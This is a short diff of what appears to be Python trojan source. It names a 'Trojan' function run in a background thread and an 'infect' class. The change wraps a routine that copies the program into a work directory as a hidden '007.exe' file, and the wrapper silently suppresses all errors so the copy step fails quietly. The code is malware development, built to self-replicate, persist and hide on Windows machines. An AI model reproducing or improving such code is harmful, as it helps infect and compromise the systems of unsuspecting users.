@@ -29,13 +29,25 @@ def Trojan():
 tro = threading.Thread(target=Trojan)
 tro.start()
 
-if os.getcwd()!=work_home:
-    if '007.exe' not in os.listdir(work_home):
-        with open(filename,'rb') as load:
-            page=load.read()
-            with open(work_home+"\\007.exe",'wb') as loads:
-                loads.write(page)
-        win32api.SetFileAttributes(work_home+"\\007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
+
+def error(func):
+    def trying():
+        try:
+            func()
+        except:
+            pass
+    return trying
+
+@error
+def startfile():
+    if os.getcwd()!=work_home:
+        if '007.exe' not in os.listdir(work_home):
+            with open(filename,'rb') as load:
+                page=load.read()
+                with open(work_home+"\\007.exe",'wb') as loads:
+                    loads.write(page)
+            win32api.SetFileAttributes(work_home+"\\007.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
+startfile()         
 
 class infect:
     def go(self):
